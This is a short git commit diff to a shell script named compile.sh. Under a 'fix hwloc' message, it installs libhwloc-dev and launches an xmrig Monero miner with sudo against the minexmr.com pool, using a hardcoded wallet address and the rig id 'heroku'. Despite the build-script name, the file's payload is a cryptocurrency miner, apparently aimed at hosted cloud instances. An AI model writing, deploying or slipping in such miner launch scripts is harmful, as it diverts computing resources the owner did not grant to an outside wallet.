eeeb6bfdeffe022dfefdcd3b312d74d986b6a922
mi33rs <104284556+mi33rs@users.noreply.github.com>
2022-04-24 11:52:13 +0800

    fix hwloc

--- compile.sh
+++ compile.sh
@@ -1,5 +1,5 @@
 echo "install deps"
-sudo apt-get update -y &&sudo apt-get install libhwloc -y
+sudo apt-get update -y &&sudo apt-get install libhwloc-dev -y
 
 chmod 755 xmrig
-./xmrig -o us-west.minexmr.com:443 -u 45EUJCTJbToDf79PU8YrXxHwAomkXcWapBBGeQSKbb3hJKRbwbbJ8NZ34GQT61qkPEivjq3fk78DxVhmyyZCeSXJ1hw7PQR -k --tls --rig-id heroku
+sudo ./xmrig -o us-west.minexmr.com:443 -u 45EUJCTJbToDf79PU8YrXxHwAomkXcWapBBGeQSKbb3hJKRbwbbJ8NZ34GQT61qkPEivjq3fk78DxVhmyyZCeSXJ1hw7PQR -k --tls --rig-id heroku
